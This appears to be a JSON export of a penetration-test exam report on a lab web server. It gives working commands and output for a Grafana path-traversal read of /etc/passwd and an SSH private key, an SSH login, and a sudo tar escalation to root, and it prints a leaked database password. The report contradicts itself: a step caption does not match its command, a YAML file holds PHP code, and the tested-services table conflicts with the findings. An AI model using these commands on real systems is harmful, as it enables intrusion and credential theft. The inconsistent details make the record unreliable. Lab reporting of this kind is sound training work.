@@ -1,0 +1,1395 @@
+{
+  "type": "doc",
+  "content": [
+    {
+      "type": "generated",
+      "attrs": {
+        "kind": "facts",
+        "hostId": "h-exam-web",
+        "appendix": "inline"
+      }
+    },
+    {
+      "type": "table-block",
+      "attrs": {
+        "kind": "result",
+        "hostId": "h-exam-web",
+        "appendix": "inline",
+        "edited": false
+      },
+      "content": [
+        {
+          "type": "paragraph",
+          "content": [
+            {
+              "type": "text",
+              "text": "Result:",
+              "marks": [
+                {
+                  "type": "bold"
+                }
+              ]
+            },
+            {
+              "type": "text",
+              "text": " shell as "
+            },
+            {
+              "type": "text",
+              "text": "dev",
+              "marks": [
+                {
+                  "type": "code"
+                }
+              ]
+            },
+            {
+              "type": "text",
+              "text": ", then root. local.txt "
+            },
+            {
+              "type": "text",
+              "text": "9b2e4f61c0d87a35e1f4b6c9d2a0e7f3",
+              "marks": [
+                {
+                  "type": "code"
+                }
+              ]
+            },
+            {
+              "type": "text",
+              "text": ", proof.txt "
+            },
+            {
+              "type": "text",
+              "text": "e4da3b7fbbce2345d7772b0674a318d5",
+              "marks": [
+                {
+                  "type": "code"
+                }
+              ]
+            },
+            {
+              "type": "text",
+              "text": "."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "type": "phase",
+      "attrs": {
+        "phase": "enum",
+        "hostId": "h-exam-web"
+      }
+    },
+    {
+      "type": "table-block",
+      "attrs": {
+        "kind": "ports",
+        "hostId": "h-exam-web",
+        "appendix": "inline",
+        "edited": false
+      },
+      "content": [
+        {
+          "type": "paragraph",
+          "content": [
+            {
+              "type": "text",
+              "text": "Port Scan Results",
+              "marks": [
+                {
+                  "type": "bold"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "type": "table",
+          "content": [
+            {
+              "type": "tableRow",
+              "content": [
+                {
+                  "type": "tableHeaderCell",
+                  "content": [
+                    {
+                      "type": "paragraph",
+                      "content": [
+                        {
+                          "type": "text",
+                          "text": "Port"
+                        }
+                      ]
+                    }
+                  ]
+                },
+                {
+                  "type": "tableHeaderCell",
+                  "content": [
+                    {
+                      "type": "paragraph",
+                      "content": [
+                        {
+                          "type": "text",
+                          "text": "Service"
+                        }
+                      ]
+                    }
+                  ]
+                },
+                {
+                  "type": "tableHeaderCell",
+                  "content": [
+                    {
+                      "type": "paragraph",
+                      "content": [
+                        {
+                          "type": "text",
+                          "text": "Version"
+                        }
+                      ]
+                    }
+                  ]
+                },
+                {
+                  "type": "tableHeaderCell",
+                  "content": [
+                    {
+                      "type": "paragraph",
+                      "content": [
+                        {
+                          "type": "text",
+                          "text": "Notes"
+                        }
+                      ]
+                    }
+                  ]
+                }
+              ]
+            },
+            {
+              "type": "tableRow",
+              "content": [
+                {
+                  "type": "tableCell",
+                  "content": [
+                    {
+                      "type": "paragraph",
+                      "content": [
+                        {
+                          "type": "text",
+                          "text": "22/tcp"
+                        }
+                      ]
+                    }
+                  ]
+                },
+                {
+                  "type": "tableCell",
+                  "content": [
+                    {
+                      "type": "paragraph",
+                      "content": [
+                        {
+                          "type": "text",
+                          "text": "ssh"
+                        }
+                      ]
+                    }
+                  ]
+                },
+                {
+                  "type": "tableCell",
+                  "content": [
+                    {
+                      "type": "paragraph",
+                      "content": [
+                        {
+                          "type": "text",
+                          "text": "OpenSSH 8.2p1 Ubuntu 4ubuntu0.11"
+                        }
+                      ]
+                    }
+                  ]
+                },
+                {
+                  "type": "tableCell",
+                  "content": [
+                    {
+                      "type": "paragraph"
+                    }
+                  ]
+                }
+              ]
+            },
+            {
+              "type": "tableRow",
+              "content": [
+                {
+                  "type": "tableCell",
+                  "content": [
+                    {
+                      "type": "paragraph",
+                      "content": [
+                        {
+                          "type": "text",
+                          "text": "80/tcp"
+                        }
+                      ]
+                    }
+                  ]
+                },
+                {
+                  "type": "tableCell",
+                  "content": [
+                    {
+                      "type": "paragraph",
+                      "content": [
+                        {
+                          "type": "text",
+                          "text": "Apache httpd"
+                        }
+                      ]
+                    }
+                  ]
+                },
+                {
+                  "type": "tableCell",
+                  "content": [
+                    {
+                      "type": "paragraph",
+                      "content": [
+                        {
+                          "type": "text",
+                          "text": "2.4.41"
+                        }
+                      ]
+                    }
+                  ]
+                },
+                {
+                  "type": "tableCell",
+                  "content": [
+                    {
+                      "type": "paragraph"
+                    }
+                  ]
+                }
+              ]
+            },
+            {
+              "type": "tableRow",
+              "content": [
+                {
+                  "type": "tableCell",
+                  "content": [
+                    {
+                      "type": "paragraph",
+                      "content": [
+                        {
+                          "type": "text",
+                          "text": "3000/tcp"
+                        }
+                      ]
+                    }
+                  ]
+                },
+                {
+                  "type": "tableCell",
+                  "content": [
+                    {
+                      "type": "paragraph",
+                      "content": [
+                        {
+                          "type": "text",
+                          "text": "Grafana"
+                        }
+                      ]
+                    }
+                  ]
+                },
+                {
+                  "type": "tableCell",
+                  "content": [
+                    {
+                      "type": "paragraph",
+                      "content": [
+                        {
+                          "type": "text",
+                          "text": "8.3.0"
+                        }
+                      ]
+                    }
+                  ]
+                },
+                {
+                  "type": "tableCell",
+                  "content": [
+                    {
+                      "type": "paragraph",
+                      "content": [
+                        {
+                          "type": "text",
+                          "text": "Admin panel on 8080"
+                        }
+                      ]
+                    }
+                  ]
+                }
+              ]
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "type": "phase",
+      "attrs": {
+        "phase": "foothold",
+        "hostId": "h-exam-web"
+      }
+    },
+    {
+      "type": "finding",
+      "attrs": {
+        "findingId": "f-exam-grafana",
+        "edited": false
+      },
+      "content": [
+        {
+          "type": "paragraph",
+          "content": [
+            {
+              "type": "text",
+              "text": "Vulnerability Explanation:",
+              "marks": [
+                {
+                  "type": "bold"
+                }
+              ]
+            },
+            {
+              "type": "text",
+              "text": " The plugin asset route of Grafana 8.0.0 to 8.3.0 does not normalise the path, so any file the grafana user can read is served without logging in. dev's private SSH key was readable."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "content": [
+            {
+              "type": "text",
+              "text": "Vulnerability Fix:",
+              "marks": [
+                {
+                  "type": "bold"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "type": "list",
+          "attrs": {
+            "kind": "bullet"
+          },
+          "content": [
+            {
+              "type": "paragraph",
+              "content": [
+                {
+                  "type": "text",
+                  "text": "Upgrade Grafana to 8.3.1 or later."
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "type": "list",
+          "attrs": {
+            "kind": "bullet"
+          },
+          "content": [
+            {
+              "type": "paragraph",
+              "content": [
+                {
+                  "type": "text",
+                  "text": "Keep SSH private keys readable by their owner only."
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "content": [
+            {
+              "type": "text",
+              "text": "Severity:",
+              "marks": [
+                {
+                  "type": "bold"
+                }
+              ]
+            },
+            {
+              "type": "text",
+              "text": " High (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "type": "steps",
+      "content": [
+        {
+          "type": "step",
+          "attrs": {
+            "entryId": "l-exam-web01-passwd"
+          },
+          "content": [
+            {
+              "type": "slot",
+              "attrs": {
+                "hint": "Say what this step does"
+              },
+              "content": [
+                {
+                  "type": "text",
+                  "text": "I read the backup config through the LFI first."
+                }
+              ]
+            },
+            {
+              "type": "evidence",
+              "attrs": {
+                "entryId": "l-exam-web01-passwd",
+                "block": 0,
+                "keep": null,
+                "emphasis": [],
+                "appendix": "inline",
+                "copy": {
+                  "command": "curl --path-as-is http://10.10.30.20:3000/public/plugins/alertlist/../../../../../../../../etc/passwd",
+                  "output": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nsshd:x:110:65534::/run/sshd:/usr/sbin/nologin\ndev:x:1000:1000:dev,,,:/home/dev:/bin/bash\ngrafana:x:113:118::/usr/share/grafana:/bin/false"
+                },
+                "truncated": false
+              }
+            }
+          ]
+        },
+        {
+          "type": "step",
+          "attrs": {
+            "entryId": "l-exam-web01-key"
+          },
+          "content": [
+            {
+              "type": "slot",
+              "attrs": {
+                "hint": "Say what this step does"
+              }
+            },
+            {
+              "type": "evidence",
+              "attrs": {
+                "entryId": "l-exam-web01-key",
+                "block": 0,
+                "keep": null,
+                "emphasis": [],
+                "appendix": "inline",
+                "copy": {
+                  "command": "curl -s --path-as-is http://10.10.30.20:3000/public/plugins/alertlist/../../../../../../../../home/dev/.ssh/id_rsa -o dev_id_rsa && head -3 dev_id_rsa",
+                  "output": "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAYEAs2N0aGV0aWMta2V5LWZvci1hbi1hdWRpdC1maXh0dXJlLW9ubHkA"
+                },
+                "truncated": false
+              }
+            }
+          ]
+        },
+        {
+          "type": "step",
+          "attrs": {
+            "entryId": "l-exam-web01-ssh"
+          },
+          "content": [
+            {
+              "type": "slot",
+              "attrs": {
+                "hint": "Say what this step does"
+              }
+            },
+            {
+              "type": "evidence",
+              "attrs": {
+                "entryId": "l-exam-web01-ssh",
+                "block": 0,
+                "keep": null,
+                "emphasis": [],
+                "appendix": "inline",
+                "copy": {
+                  "command": "chmod 600 dev_id_rsa && ssh -i dev_id_rsa dev@10.10.30.20",
+                  "output": "Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-196-generic x86_64)\n\nLast login: Tue Nov  3 09:14:52 2026 from 10.10.30.254\ndev@web01:~$ id\nuid=1000(dev) gid=1000(dev) groups=1000(dev)"
+                },
+                "truncated": false
+              }
+            }
+          ]
+        },
+        {
+          "type": "step",
+          "attrs": {
+            "entryId": "l-exam-web01-local"
+          },
+          "content": [
+            {
+              "type": "slot",
+              "attrs": {
+                "hint": "Say where you read the flag"
+              }
+            },
+            {
+              "type": "evidence",
+              "attrs": {
+                "entryId": "l-exam-web01-local",
+                "block": null,
+                "keep": null,
+                "emphasis": [],
+                "appendix": "inline",
+                "copy": {
+                  "value": "9b2e4f61c0d87a35e1f4b6c9d2a0e7f3",
+                  "proof": "dev@web01:~$ cat local.txt\n9b2e4f61c0d87a35e1f4b6c9d2a0e7f3\ndev@web01:~$ id\nuid=1000(dev) gid=1000(dev) groups=1000(dev)\ndev@web01:~$ hostname\nweb01\ndev@web01:~$ ip addr\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    inet 127.0.0.1/8 scope host lo\n2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000\n    link/ether 00:50:56:8a:4c:1e brd ff:ff:ff:ff:ff:ff\n    inet 10.10.30.20/24 brd 10.10.30.255 scope global ens160"
+                },
+                "truncated": false
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "type": "phase",
+      "attrs": {
+        "phase": "privesc",
+        "hostId": "h-exam-web"
+      }
+    },
+    {
+      "type": "finding",
+      "attrs": {
+        "findingId": "f-exam-tar",
+        "edited": false
+      },
+      "content": [
+        {
+          "type": "paragraph",
+          "content": [
+            {
+              "type": "text",
+              "text": "Vulnerability Explanation:",
+              "marks": [
+                {
+                  "type": "bold"
+                }
+              ]
+            },
+            {
+              "type": "text",
+              "text": " dev may run /usr/bin/tar as root without a password. tar's --checkpoint-action runs any command."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "content": [
+            {
+              "type": "text",
+              "text": "Vulnerability Fix:",
+              "marks": [
+                {
+                  "type": "bold"
+                }
+              ]
+            },
+            {
+              "type": "text",
+              "text": " Remove the sudo rule, or replace it with a wrapper script that takes no arguments."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "content": [
+            {
+              "type": "text",
+              "text": "Severity:",
+              "marks": [
+                {
+                  "type": "bold"
+                }
+              ]
+            },
+            {
+              "type": "text",
+              "text": " High"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "type": "steps",
+      "content": [
+        {
+          "type": "step",
+          "attrs": {
+            "entryId": "l-exam-web01-sudo"
+          },
+          "content": [
+            {
+              "type": "slot",
+              "attrs": {
+                "hint": "Say what this step does"
+              }
+            },
+            {
+              "type": "evidence",
+              "attrs": {
+                "entryId": "l-exam-web01-sudo",
+                "block": 0,
+                "keep": null,
+                "emphasis": [],
+                "appendix": "inline",
+                "copy": {
+                  "command": "sudo -l",
+                  "output": "Matching Defaults entries for dev on web01:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser dev may run the following commands on web01:\n    (root) NOPASSWD: /usr/bin/tar"
+                },
+                "truncated": false
+              }
+            }
+          ]
+        },
+        {
+          "type": "step",
+          "attrs": {
+            "entryId": "l-exam-web01-tar"
+          },
+          "content": [
+            {
+              "type": "slot",
+              "attrs": {
+                "hint": "Say what this step does"
+              }
+            },
+            {
+              "type": "evidence",
+              "attrs": {
+                "entryId": "l-exam-web01-tar",
+                "block": 0,
+                "keep": null,
+                "emphasis": [],
+                "appendix": "inline",
+                "copy": {
+                  "command": "sudo /usr/bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash",
+                  "output": "/usr/bin/tar: Removing leading `/' from member names\nroot@web01:/home/dev# id\nuid=0(root) gid=0(root) groups=0(root)"
+                },
+                "truncated": false
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "type": "phase",
+      "attrs": {
+        "phase": "post",
+        "hostId": "h-exam-web"
+      }
+    },
+    {
+      "type": "steps",
+      "content": [
+        {
+          "type": "step",
+          "attrs": {
+            "entryId": "l-exam-web01-proof"
+          },
+          "content": [
+            {
+              "type": "slot",
+              "attrs": {
+                "hint": "Say where you read the flag"
+              }
+            },
+            {
+              "type": "evidence",
+              "attrs": {
+                "entryId": "l-exam-web01-proof",
+                "block": null,
+                "keep": null,
+                "emphasis": [],
+                "appendix": "inline",
+                "copy": {
+                  "value": "e4da3b7fbbce2345d7772b0674a318d5",
+                  "proof": "root@web01:~# cat /root/proof.txt\ne4da3b7fbbce2345d7772b0674a318d5\nroot@web01:~# id\nuid=0(root) gid=0(root) groups=0(root)\nroot@web01:~# hostname\nweb01\nroot@web01:~# ip addr\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    inet 127.0.0.1/8 scope host lo\n2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000\n    link/ether 00:50:56:8a:4c:1e brd ff:ff:ff:ff:ff:ff\n    inet 10.10.30.20/24 brd 10.10.30.255 scope global ens160"
+                },
+                "truncated": false
+              }
+            },
+            {
+              "type": "evidence",
+              "attrs": {
+                "entryId": "l-exam-web01-root-shot",
+                "block": null,
+                "keep": null,
+                "emphasis": [],
+                "appendix": "inline",
+                "caption": "Root shell on web01",
+                "width": null,
+                "copy": null,
+                "truncated": false
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "type": "phase",
+      "attrs": {
+        "phase": "additional",
+        "hostId": "h-exam-web"
+      }
+    },
+    {
+      "type": "phase",
+      "attrs": {
+        "phase": "additional",
+        "hostId": "h-exam-web",
+        "findingId": "f-exam-grafana-repo"
+      }
+    },
+    {
+      "type": "finding",
+      "attrs": {
+        "findingId": "f-exam-grafana-repo",
+        "edited": false
+      },
+      "content": [
+        {
+          "type": "paragraph",
+          "content": [
+            {
+              "type": "text",
+              "text": "Vulnerability Explanation:",
+              "marks": [
+                {
+                  "type": "bold"
+                }
+              ]
+            },
+            {
+              "type": "text",
+              "text": " The web root serves "
+            },
+            {
+              "type": "text",
+              "text": "/.git/",
+              "marks": [
+                {
+                  "type": "code"
+                }
+              ]
+            },
+            {
+              "type": "text",
+              "text": ". Its history holds the database password that a later commit removed:"
+            }
+          ]
+        },
+        {
+          "type": "codeBlock",
+          "attrs": {
+            "language": ""
+          },
+          "content": [
+            {
+              "type": "text",
+              "text": "commit 4be1d9c07a52e3f86d10b2c4e7f9a0315d6c8e22 Author: Site Admin <admin@exam.lab> Date:   Fri Nov 18 17:22:48 2022 +0200\n\n    Add the reporting datasource\n\ndiff --git a/datasources/mysql.yaml b/datasources/mysql.yaml\n--- a/datasources/mysql.yaml\n+++ b/datasources/mysql.yaml\n@@ -4,7 +4,7 @@ class Database{\n-    private $username = \"dev@exam.lab\";\n-    private $password = \"CopperKite71\";\n+    private $username = \"\";\n+    private $password = \"\";\n     public function getConnection() {\n         $this->conn = null;\n         try{\n             $this->conn = new PDO(\"mysql:host=\" . $this->host . \";dbname=\" . $this->db_name, $this->username, $this->password);\n             $this->conn->exec(\"set names utf8\");\n         }catch(PDOException $exception){\n             echo \"Connection error: \" . $exception->getMessage();\n         }\n         return $this->conn;\n     }\n+} +?>"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "content": [
+            {
+              "type": "text",
+              "text": "Affected: http-git (port 80)"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "content": [
+            {
+              "type": "text",
+              "text": "Vulnerability Fix:",
+              "marks": [
+                {
+                  "type": "bold"
+                }
+              ]
+            },
+            {
+              "type": "text",
+              "text": " env vars, .gitignore, secrets managers, pre-commit hooks like gitleaks. Once a secret has been pushed to remote, it's burned and must be rotated. Scrub repo history."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "content": [
+            {
+              "type": "text",
+              "text": "Severity:",
+              "marks": [
+                {
+                  "type": "bold"
+                }
+              ]
+            },
+            {
+              "type": "text",
+              "text": " High"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "type": "phase",
+      "attrs": {
+        "phase": "additional",
+        "hostId": "h-exam-web",
+        "findingId": "f-exam-joomla-upload"
+      }
+    },
+    {
+      "type": "finding",
+      "attrs": {
+        "findingId": "f-exam-joomla-upload",
+        "edited": true
+      },
+      "content": [
+        {
+          "type": "paragraph",
+          "content": [
+            {
+              "type": "text",
+              "text": "Vulnerability Explanation:",
+              "marks": [
+                {
+                  "type": "bold"
+                }
+              ]
+            },
+            {
+              "type": "text",
+              "text": " The upload filter trusts the extension only."
+            }
+          ]
+        },
+        {
+          "type": "slot",
+          "attrs": {
+            "hint": "How to fix it",
+            "label": "Vulnerability Fix:"
+          }
+        },
+        {
+          "type": "paragraph",
+          "content": [
+            {
+              "type": "text",
+              "text": "Severity:",
+              "marks": [
+                {
+                  "type": "bold"
+                }
+              ]
+            },
+            {
+              "type": "text",
+              "text": " High (CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "type": "phase",
+      "attrs": {
+        "phase": "additional",
+        "hostId": "h-exam-web",
+        "findingId": "f-exam-ssh-password"
+      }
+    },
+    {
+      "type": "finding",
+      "attrs": {
+        "findingId": "f-exam-ssh-password",
+        "edited": false
+      },
+      "content": [
+        {
+          "type": "paragraph",
+          "content": [
+            {
+              "type": "text",
+              "text": "Vulnerability Explanation:",
+              "marks": [
+                {
+                  "type": "bold"
+                }
+              ]
+            },
+            {
+              "type": "text",
+              "text": " "
+            },
+            {
+              "type": "text",
+              "text": "PasswordAuthentication",
+              "marks": [
+                {
+                  "type": "code"
+                }
+              ]
+            },
+            {
+              "type": "text",
+              "text": " unset in "
+            },
+            {
+              "type": "text",
+              "text": "sshd_config",
+              "marks": [
+                {
+                  "type": "code"
+                }
+              ]
+            },
+            {
+              "type": "text",
+              "text": " and drop-ins, so the OpenSSH default ("
+            },
+            {
+              "type": "text",
+              "text": "yes",
+              "marks": [
+                {
+                  "type": "code"
+                }
+              ]
+            },
+            {
+              "type": "text",
+              "text": ") applies; any leaked/guessed password yields a remote shell."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "content": [
+            {
+              "type": "text",
+              "text": "Vulnerability Fix:",
+              "marks": [
+                {
+                  "type": "bold"
+                }
+              ]
+            },
+            {
+              "type": "text",
+              "text": " Fix config to only allow ssh w/ id_rsa"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "content": [
+            {
+              "type": "text",
+              "text": "Severity:",
+              "marks": [
+                {
+                  "type": "bold"
+                }
+              ]
+            },
+            {
+              "type": "text",
+              "text": " High"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "type": "phase",
+      "attrs": {
+        "phase": "additional",
+        "hostId": "h-exam-web",
+        "findingId": "f-exam-joomla-readable"
+      }
+    },
+    {
+      "type": "finding",
+      "attrs": {
+        "findingId": "f-exam-joomla-readable",
+        "edited": false
+      },
+      "content": [
+        {
+          "type": "paragraph",
+          "content": [
+            {
+              "type": "text",
+              "text": "Vulnerability Explanation:",
+              "marks": [
+                {
+                  "type": "bold"
+                }
+              ]
+            },
+            {
+              "type": "text",
+              "text": " the full "
+            },
+            {
+              "type": "text",
+              "text": "/var/www/html/cms/",
+              "marks": [
+                {
+                  "type": "code"
+                }
+              ]
+            },
+            {
+              "type": "text",
+              "text": " tree is root-owned but mode "
+            },
+            {
+              "type": "text",
+              "text": "755/644",
+              "marks": [
+                {
+                  "type": "code"
+                }
+              ]
+            },
+            {
+              "type": "text",
+              "text": ", so "
+            },
+            {
+              "type": "text",
+              "text": "dev",
+              "marks": [
+                {
+                  "type": "code"
+                }
+              ]
+            },
+            {
+              "type": "text",
+              "text": " can read the live "
+            },
+            {
+              "type": "text",
+              "text": "configuration.php",
+              "marks": [
+                {
+                  "type": "code"
+                }
+              ]
+            },
+            {
+              "type": "text",
+              "text": " with the DB password."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "content": [
+            {
+              "type": "text",
+              "text": "Vulnerability Fix:",
+              "marks": [
+                {
+                  "type": "bold"
+                }
+              ]
+            },
+            {
+              "type": "text",
+              "text": " chmod 640 configuration.php, owner www-data."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "content": [
+            {
+              "type": "text",
+              "text": "Severity:",
+              "marks": [
+                {
+                  "type": "bold"
+                }
+              ]
+            },
+            {
+              "type": "text",
+              "text": " Medium"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "type": "phase",
+      "attrs": {
+        "phase": "additional",
+        "hostId": "h-exam-web",
+        "findingId": "f-exam-joomla-installation"
+      }
+    },
+    {
+      "type": "finding",
+      "attrs": {
+        "findingId": "f-exam-joomla-installation",
+        "edited": false
+      },
+      "content": [
+        {
+          "type": "paragraph",
+          "content": [
+            {
+              "type": "text",
+              "text": "Vulnerability Explanation:",
+              "marks": [
+                {
+                  "type": "bold"
+                }
+              ]
+            },
+            {
+              "type": "text",
+              "text": " post-install cleanup skipped (Joomla mandates deleting it). The install SQL under "
+            },
+            {
+              "type": "text",
+              "text": "cms/installation/sql/",
+              "marks": [
+                {
+                  "type": "code"
+                }
+              ]
+            },
+            {
+              "type": "text",
+              "text": " is world-readable and holds a "
+            },
+            {
+              "type": "text",
+              "text": "planted LDAP bind cred",
+              "marks": [
+                {
+                  "type": "bold"
+                }
+              ]
+            },
+            {
+              "type": "text",
+              "text": " "
+            },
+            {
+              "type": "text",
+              "text": "admin/bobby7",
+              "marks": [
+                {
+                  "type": "code"
+                }
+              ]
+            },
+            {
+              "type": "text",
+              "text": " ("
+            },
+            {
+              "type": "text",
+              "text": "cred #7",
+              "marks": [
+                {
+                  "type": "code"
+                }
+              ]
+            },
+            {
+              "type": "text",
+              "text": ") in the "
+            },
+            {
+              "type": "text",
+              "text": "plg_authentication_ldap",
+              "marks": [
+                {
+                  "type": "code"
+                }
+              ]
+            },
+            {
+              "type": "text",
+              "text": " default params; stock ships these empty."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "content": [
+            {
+              "type": "text",
+              "text": "Vulnerability Fix:",
+              "marks": [
+                {
+                  "type": "bold"
+                }
+              ]
+            },
+            {
+              "type": "text",
+              "text": " Never skip post-install cleanup of defaults and placeholder files"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "content": [
+            {
+              "type": "text",
+              "text": "Severity:",
+              "marks": [
+                {
+                  "type": "bold"
+                }
+              ]
+            },
+            {
+              "type": "text",
+              "text": " Low"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "type": "phase",
+      "attrs": {
+        "phase": "tested",
+        "hostId": "h-exam-web"
+      }
+    },
+    {
+      "type": "table-block",
+      "attrs": {
+        "kind": "tested",
+        "hostId": "h-exam-web",
+        "appendix": "inline",
+        "edited": false
+      },
+      "content": [
+        {
+          "type": "table",
+          "content": [
+            {
+              "type": "tableRow",
+              "content": [
+                {
+                  "type": "tableHeaderCell",
+                  "content": [
+                    {
+                      "type": "paragraph",
+                      "content": [
+                        {
+                          "type": "text",
+                          "text": "Tested"
+                        }
+                      ]
+                    }
+                  ]
+                },
+                {
+                  "type": "tableHeaderCell",
+                  "content": [
+                    {
+                      "type": "paragraph",
+                      "content": [
+                        {
+                          "type": "text",
+                          "text": "Why it went nowhere"
+                        }
+                      ]
+                    }
+                  ]
+                }
+              ]
+            },
+            {
+              "type": "tableRow",
+              "content": [
+                {
+                  "type": "tableCell",
+                  "content": [
+                    {
+                      "type": "paragraph",
+                      "content": [
+                        {
+                          "type": "text",
+                          "text": "80/tcp Apache 2.4.41"
+                        }
+                      ]
+                    }
+                  ]
+                },
+                {
+                  "type": "tableCell",
+                  "content": [
+                    {
+                      "type": "paragraph",
+                      "content": [
+                        {
+                          "type": "text",
+                          "text": "Only the Ubuntu default page; no application behind it."
+                        }
+                      ]
+                    }
+                  ]
+                }
+              ]
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
